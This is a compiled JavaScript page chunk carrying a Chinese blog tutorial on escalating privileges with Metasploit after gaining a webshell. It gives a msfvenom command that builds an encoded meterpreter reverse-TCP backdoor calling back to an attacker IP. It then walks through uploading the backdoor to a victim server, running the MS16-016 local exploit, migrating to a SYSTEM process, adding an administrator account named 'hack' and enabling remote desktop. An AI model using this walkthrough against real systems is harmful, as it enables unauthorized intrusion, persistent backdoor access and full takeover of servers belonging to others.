(window.webpackJsonp=window.webpackJsonp||[]).push([[177],{632:function(s,a,t){"use strict";t.r(a);var l=t(24),v=Object(l.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"msf提权"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#msf提权"}},[s._v("#")]),s._v(" MSF提权")]),s._v(" "),t("p",[s._v("在WEB渗透中当我们拿到webshell了，我们可以试试用MSF(metasploit)来进行提权，在MSF里meterpreter很强大的！")]),s._v(" "),t("p",[s._v("我们先用msfvenom生成一个EXE的木马后门。")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),s._v(" -b "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'\\x00'")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LHOST")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".1.7 "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LPORT")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("4444")]),s._v(" -f exe "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" abc.exe\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106221604920.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("然后在到MSF根据刚才配置的木马后门进行监听...")]),s._v(" "),t("p",[s._v("然后在把木马上传到服务器（受害者）的机器里，必须上传到可读可写的目录下")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106221651573.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("比如这里我吧abc.exe上传到了C:\\users\\leak\\desktop\\目录下，")]),s._v(" "),t("p",[s._v("abc.exe就是我刚才生成的后门。")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106221723788.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("然后在执行我们的后门，可以看见MSF弹回了一个session 1(会话连接)。")]),s._v(" "),t("p",[s._v("说明我们后门程序成功执行起来了，当然你也可以在webshell执行的，")]),s._v(" "),t("p",[s._v("但必须的有一点执行的权限")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019010622180692.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("getuid //可以看见我们的权限很低的，一般都是user权限的，")]),s._v(" "),t("p",[s._v("但也遇到过某些服务器执行后就直接是system最高权限。像这种我们就直接加用户啦。")]),s._v(" "),t("p",[s._v("这里我们是user权限，我们要把它提升到system权限。Windows最高权限")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106221851139.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("接着我们输入命令")]),s._v(" "),t("p",[s._v("background   //把你当前的metasploit shell转为后台执行。")]),s._v(" "),t("p",[s._v("search ms16  // 搜索关键字相关的漏洞")]),s._v(" "),t("p",[s._v(".....然后我选择了MS16-016这个漏洞在进行提权")]),s._v(" "),t("p",[s._v("use exploit/windows/local/ms16_016_webdav //  选择漏洞")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106221937551.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("show options  //查看漏洞里边要设置的参数")]),s._v(" "),t("p",[s._v("可以看见只有一个SESSION参数要设置")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106222107730.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("set  SESSION 1 // 设置会刚才我们后门连接的ID号 1")]),s._v(" "),t("p",[s._v("exploit //执行提权...")]),s._v(" "),t("p",[s._v("可以看见成功的吧漏洞利用到了PID为692的进程中...")]),s._v(" "),t("p",[s._v("虽然提权成功了 但你getuid下还是看见的是user权限")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019010622214883.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("ps一下查看进程")]),s._v(" "),t("p",[s._v("根据刚才的提示找到PID 692的进程")]),s._v(" "),t("p",[s._v("可以看见确实是system权限")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106222225510.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("所以我们还要用到migrate 命令 //迁移到一个指定的进程ID。")]),s._v(" "),t("p",[s._v("migrate 692  //")]),s._v(" "),t("p",[s._v("在getuid下可以看见为system权限啦")]),s._v(" "),t("p",[s._v("提权成功了")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106222259401.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("既然有了system权限 那我们在添加账号hack")]),s._v(" "),t("p",[s._v("添加为管理员组")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106222350540.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("用Nmap扫下并没有开启远程登陆3389")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106222445235.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("run getgui -e  //开启目标主机3389  貌似这条MSF命令只对2003的系统有效 执行几次都没成功")]),s._v(" "),t("p",[s._v("所以就用cmd命令开了3389端口")]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190106222845638.jpg",loading:"lazy"}})]),s._v(" "),t("p",[s._v("提权成功，登录服务器。。。")]),s._v(" "),t("h2",{attrs:{id:"写在最后"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),t("blockquote",[t("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),t("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);a.default=v.exports}}]);